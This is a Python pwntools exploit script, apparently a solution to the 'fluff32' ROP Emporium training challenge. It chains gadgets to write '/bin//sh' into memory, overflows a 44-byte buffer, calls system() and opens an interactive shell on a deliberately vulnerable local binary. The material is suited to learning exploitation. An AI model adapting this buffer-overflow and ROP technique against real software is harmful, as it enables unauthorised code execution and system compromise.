from pwn import *

# in data segment
data = [0x804a028, 0x804a02c]

# indside usefulFunction
system = 0x0804865a
 
def writebinsh():

  trash = "AAAA"
  binsh = ["/bin", "//sh"]
  
  ret  = ""  
  for i in range(0, 2):
    ### get data in ecx ###
    # clear edx (get zero)
    ret += p32(0x08048671) # xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
    ret += trash
    ret += p32(0x080483e1) # pop ebx; ret;
    ret += p32(data[i])
    # ebx into edx (xor with zero)
    ret += p32(0x0804867b) # xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
    ret += trash
    # xchange edx and ecx
    ret += p32(0x08048689) # xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
    ret += trash

    ### get /bin in edx ### >>> DO THIS AFTER getting data into ecx <<<
    # clear edx (get zero)
    ret += p32(0x08048671) # xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
    ret += trash
    ret += p32(0x080483e1) # pop ebx; ret;
    ret += binsh[i]
    # xchg edx, ebx
    ret += p32(0x0804867b) # xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
    ret += trash
    ret += p32(0x08048693) # mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
    ret += trash # for ebp
    # as the next instruction in gadget will xor [ecx] with bl (lower 8 bit of ebx)
    ret += p32(0x00000000)  # for ebx

  return ret

def CallSystem(systemaddr):
  ret = ""
  ret += p32(system)
  ret += p32(data[0])
  return ret
  
pad = 'A'*44

ret = ""

ret += writebinsh()
ret += CallSystem(system)

payload = pad + ret

print payload

elf = ELF('fluff32')

io = process(elf.path)
io.recvuntil("> ")
io.sendline(payload)
io.interactive()